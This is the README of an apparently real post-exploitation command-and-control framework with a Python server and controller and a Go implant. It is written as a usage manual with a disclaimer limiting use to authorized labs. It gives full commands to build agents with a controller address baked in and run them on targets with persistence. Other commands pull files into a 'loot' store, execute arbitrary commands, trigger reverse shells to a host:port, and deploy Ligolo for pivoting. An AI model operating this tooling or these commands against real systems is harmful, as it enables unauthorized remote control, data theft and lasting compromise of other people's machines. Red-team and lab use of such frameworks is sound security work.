# Hydrangea C2

```
   ▄█    █▄    ▄██   ▄   ████████▄     ▄████████    ▄████████ ███▄▄▄▄      ▄██████▄     ▄████████    ▄████████
  ███    ███   ███   ██▄ ███   ▀███   ███    ███   ███    ███ ███▀▀▀██▄   ███    ███   ███    ███   ███    ███
  ███    ███   ███▄▄▄███ ███    ███   ███    ███   ███    ███ ███   ███   ███    █▀    ███    █▀    ███    ███
 ▄███▄▄▄▄███▄▄ ▀▀▀▀▀▀███ ███    ███  ▄███▄▄▄▄██▀   ███    ███ ███   ███  ▄███         ▄███▄▄▄       ███    ███
▀▀███▀▀▀▀███▀  ▄██   ███ ███    ███ ▀▀███▀▀▀▀▀   ▀███████████ ███   ███ ▀▀███ ████▄  ▀▀███▀▀▀     ▀███████████
  ███    ███   ███   ███ ███    ███ ▀███████████   ███    ███ ███   ███   ███    ███   ███    █▄    ███    ███
  ███    ███   ███   ███ ███   ▄███   ███    ███   ███    ███ ███   ███   ███    ███   ███    ███   ███    ███
  ███    █▀     ▀█████▀  ████████▀    ███    ███   ███    █▀   ▀█   █▀    ████████▀    ██████████   ███    █▀
                                      ███    ███

              Hydrangea C2 •  V4.0
```

Hydrangea is a modular command-and-control (C2) framework designed for simple and reliable post-exploitation fleet management. It features a Python-based server and controller, plus a Go client agent, enabling efficient management of multiple endpoints over TCP. Hydrangea supports **file transfers**, **remote command execution**, **reverse shell management**, **port forwarding**, and more, all with a focus on clarity, minimalism, and explicit control. Intended for trusted environments, it emphasizes ease of use, extensibility, and security best practices.

---

For detailed documentation please consider reading the [Wiki](https://github.com/tristanqtn/Hydrangea-C2/wiki).

---

## Table of Contents

- [Overview](#overview)
- [Disclaimer](#disclaimer)
- [Architecture](#architecture)
- [Install & Run](#install--run)
- [TLS](#tls)
- [Orders & Methods](#orders--methods)
- [Storage & Paths](#storage--paths)

---

## Overview

### Back Story

Hydrangea was born out of necessity. While working through certifications, CTFs, and personal research, I needed a straightforward way to manage a small fleet during post-exploitation phases, without wrestling bulky, over-engineered C2s. I wanted something simple, agile, and explicit: clear orders in, clear results out. So I built it. Hydrangea keeps the surface area small and the workflow calm, designed for authorized lab and internal environments where reliability and readability matter more than bells and whistles. Sometimes the easiest way is to make it yourself.

### Structure

Hydrangea C2 has three parts:

- **Server** (`server/server.py`) — listens on one or more TCP ports, tracks connected clients, relays orders, stores incoming files.
- **Controller** (`server/ctl.py`) — interactive REPL with arrow-key history, tab completion, and a Rich-powered UI.
- **Client** (`client/go/`) — Go agent that registers to the server and executes orders (list, file transfer, exec, session info, reverse shell, port forward).

> Use on **trusted networks/hosts** with explicit authorization only.

---

## Disclaimer

> [!CAUTION]
> Hydrangea C2 is provided **solely for lawful, authorized use** — such as lab work, education, and environments where you **own or have explicit permission** to manage the systems involved. Using this software to access, monitor, or modify computers **without consent** may violate laws and regulations. **You are responsible** for complying with all applicable laws, policies, and contractual obligations. The authors and distributors **do not accept liability** for misuse, damage, loss of data, or any consequences arising from the use of this software. Use responsibly.

---

## Architecture

```
[ Controller ]  ── ADMIN RPC ──▶  [ Server ]  ══ orders ══▶  [ Client(s) ]
                                              ◀══ results ══
```

- Transport: custom **length-prefixed binary frame** — 4-byte big-endian header length → UTF-8 JSON header → optional binary payload.
- The server accepts both admin (controller) and agent connections on the same ports, distinguished by the initial handshake type.
- Async responses (`list`, `exec`, `session`) are correlated with a `req_id` UUID so multiple in-flight requests can coexist.
- Keepalive: server PINGs every 30 s, evicts agents silent for 90 s.

---

## Install & Run

### Prerequisites

| Component | Requirement |
|---|---|
| Server & Controller | Python **3.10+**, [Poetry](https://python-poetry.org/) |
| Go agent (build) | Go **1.23+** |
| Go agent (cross-compile) | [Nix](https://nixos.org/) |
| TLS auto-cert | `openssl` in `PATH` |

### 1 — Install Python dependencies

```bash
# From the project root
poetry install
```

This installs the `hydrangea` package and its dependencies (`rich`, `prompt_toolkit`) into an isolated virtualenv. The `ruff` linter is installed in the dev group only.

### 2 — Start the server

The server uses two distinct port types:
- **`--admin-port`** — accepts controller connections only, authenticated with `--admin-token`
- **`--ports`** — accepts agent/beacon connections, authenticated with `--agent-token`

```bash
# Minimal: separate admin and agent ports, single agent token
poetry run hydrangea-server \
  --admin-port 9000 --ports 9001 \
  --admin-token admin-secret --agent-token beacon-token

# Multiple agent ports, multiple agent tokens (one per team or per implant)
poetry run hydrangea-server \
  --admin-port 9000 --ports 9001 9002 --storage ./loot \
  --admin-token admin-secret \
  --agent-token team-a --agent-token team-b

# No agent tokens at startup — add them at runtime via the controller
poetry run hydrangea-server \
  --admin-port 9000 --ports 9001 \
  --admin-token admin-secret

# With TLS (auto-generates a self-signed cert via openssl)
poetry run hydrangea-server \
  --admin-port 9000 --ports 9001 \
  --admin-token admin-secret --agent-token beacon-token --tls-auto

# With your own cert/key
poetry run hydrangea-server \
  --admin-port 9000 --ports 9001 \
  --admin-token admin-secret --agent-token beacon-token \
  --tls-cert server.crt --tls-key server.key
```

The server prints a SHA-256 fingerprint when TLS is enabled — copy it for use with the controller and agents.

> **Note:** The admin port rejects `REGISTER` frames (agent connections) and the agent ports reject `ADMIN` frames (controller connections). Both violations are logged.

### 3 — Start the controller

```bash
# Connect to a local server
poetry run hydrangea-ctl --port 9000 --auth-token admin-secret

# Connect to a remote server
poetry run hydrangea-ctl --host 10.0.0.1 --port 9000 --auth-token admin-secret

# With TLS + fingerprint pinning
poetry run hydrangea-ctl --port 9000 --auth-token admin-secret \
  --tls --tls-fingerprint <hex-from-server>

# UI flags
poetry run hydrangea-ctl --port 9000 --auth-token admin-secret --no-banner --no-color
```

The controller validates connectivity and token before entering the REPL. Once inside:

- **↑ / ↓** — browse command history (persisted in `~/.hydrangea_history`)
- **Tab** — complete command names
- **Ctrl+R** — reverse history search
- **exit / quit / Ctrl+D** — prompts for confirmation before closing

### 4 — Build and deploy a Go agent

**From the controller REPL:**

```
hydrangea ❯  build-client --server-host 10.0.0.1 --server-port 9001 \
               --build-auth-token beacon-token --client-id target-1 --out ./agents

# With TLS baked in
hydrangea ❯  build-client --server-host 10.0.0.1 --server-port 9001 \
               --build-auth-token beacon-token --build-tls \
               --build-tls-fingerprint <hex> --out ./agents
```

**Or manually:**

```bash
cd client/go

# Plain build
go build -o hydrangea-client .

# With baked-in defaults
go build \
  -ldflags "-X main.DefaultServerHost=10.0.0.1 \
            -X main.DefaultServerPort=9001 \
            -X main.DefaultAuthToken=beacon-token \
            -X main.DefaultClientID=target-1" \
  -o hydrangea-client .

# Cross-compile via Nix
nix build ".#hydrangea-client-linux"
nix build ".#hydrangea-client-windows"
```

**Run the agent on the target:**

```bash
# Point the agent at an agent port (not the admin port)
./hydrangea-client --server 10.0.0.1 --port 9001 --auth-token beacon-token --client-id target-1

# With TLS (fingerprint pins the self-signed cert)
./hydrangea-client --server 10.0.0.1 --port 9001 --auth-token beacon-token \
  --tls --tls-fingerprint <hex>

# Additional flags
./hydrangea-client ... [--persist] [--debug] [--device-info] [--test-connection]
```

> The agent token must match the token accepted on the target agent port (global or port-exclusive).

---

## TLS

All three components support TLS with optional certificate pinning.

| Flag | Where | Effect |
|---|---|---|
| `--tls-auto` | server | Generate a self-signed cert via `openssl` |
| `--tls-cert` / `--tls-key` | server | Use your own certificate |
| `--tls` | controller, agent | Enable TLS on the connection |
| `--tls-fingerprint <hex>` | controller, agent | Pin the server's leaf-cert SHA-256 (implies `--tls`) |

Without `--tls-fingerprint`, TLS is still used but the certificate is not verified — suitable for quick testing with self-signed certs. With the fingerprint, the connection is aborted if the cert doesn't match.

The server prints the fingerprint at startup when TLS is enabled. Copy-paste it directly into `--tls-fingerprint` or `--build-tls-fingerprint`.

---

## Orders & Methods

Hydrangea exposes a small, explicit surface. Anything not listed here isn't implemented.

### Context

| Command | Description |
|---|---|
| `use <id>` | Set the active client — subsequent commands target it without `--client` |
| `unuse` | Clear the active client |

### Client

| Command | Description |
|---|---|
| `clients` | List all connected agents with their server port, user, hostname, and beacon address |
| `ping [--client <id>] [--timeout <s>]` | Ping a client and display round-trip time in ms |
| `session [--client <id>]` | Fetch OS, user, PID, cwd, and runtime info |

### Files

| Command | Description |
|---|---|
| `list [--client <id>] [--path <p>] [--timeout <s>] [--no-wait]` | List a directory on the agent. Results are shown immediately by default; `--no-wait` queues the order and logs the result server-side only. |
| `pull [--client <id>] --src <agent_path> --dest <server_path>` | Pull a file from the agent to the server. Relative `--dest` lands under `server_storage/<client_id>/`; absolute paths are written exactly there. |
| `push [--client <id>] --src <local_path> --dest <agent_path>` | Push a local file to the agent. |

### Execution

| Command | Description |
|---|---|
| `exec [--client <id>] --command "<cmd>" [--shell] [--cwd <p>] [--timeout <s>]` | Run a command on the agent; returns `rc`, `stdout`, and `stderr`. Pass a JSON list for argv (`["ls","-la"]`) or a plain string. |
| `server-exec --command "<cmd>" [--timeout <s>]` | Run a shell command directly on the server host; returns `rc`, `stdout`, and `stderr`. |
| `local <cmd>` | Run a command locally on the controller machine (5-minute timeout). |

### Advanced

| Command | Description |
|---|---|
| `reverse-shell [--client <id>] <host:port>` | Tell the agent to connect back with a shell. Start your listener **before** issuing this command. |
| `port-forward [--client <id>] --ligolo-path <bin> --connect-args "<args>"` | Upload and launch a Ligolo agent for port forwarding. |

### Build & Server Management

| Command | Description |
|---|---|
| `build-client [options]` | Compile Go agents with baked-in server details. See [Build and deploy a Go agent](#4--build-and-deploy-a-go-agent). |
| `server-status` | Show server health and recent log entries. |
| `server-config` | Show the current server port and token configuration (tokens masked). |
| `add-agent-token --token <t> [--port <p>]` | Register a new agent auth token globally, or bind it exclusively to a specific agent port. |
| `add-agent-port --port <p> [--token <t>]` | Open a new agent listening port at runtime. Optionally bind an exclusive token to it. |
| `remove-agent-token --token <t> [--port <p>]` | Remove an agent token from the global set, or from a port's exclusive set. |
| `remove-agent-port --port <p>` | Close an agent listening port and evict all connected agents on that port. The admin port cannot be removed. |

#### Token scoping

By default all `--agent-token` values form a global set accepted on every agent port. When you bind a token to a specific port via `add-agent-token --port`, that port enters **exclusive mode** — only tokens bound to it are accepted, and the global set is bypassed for that port.

```
# Global token (accepted on all agent ports that are not in exclusive mode)
hydrangea ❯  add-agent-token --token team-all

# Port-exclusive token (only this token works on :9002)
hydrangea ❯  add-agent-token --token team-red --port 9002

# Open a new port with its own exclusive token in one step
hydrangea ❯  add-agent-port --port 9003 --token team-blue

# Inspect the result
hydrangea ❯  server-config
```

---

## Storage & Paths

**Server side**
- Pulled files land in `server_storage/<client_id>/` by default.
- An absolute `--dest` (e.g. `/tmp/out.bin`) is written exactly at that path on the server host.

**Agent side (Go)**
- Absolute paths on the agent are allowed and resolve as-is (full filesystem access).
- Relative paths resolve against the agent's `--root` base directory.
- Parent directories are created automatically on `push`.

---

## Development

```bash
# Lint
poetry run ruff check server/

# Format
poetry run ruff format server/

# Check types / imports after changes
poetry run ruff check --select I server/
```
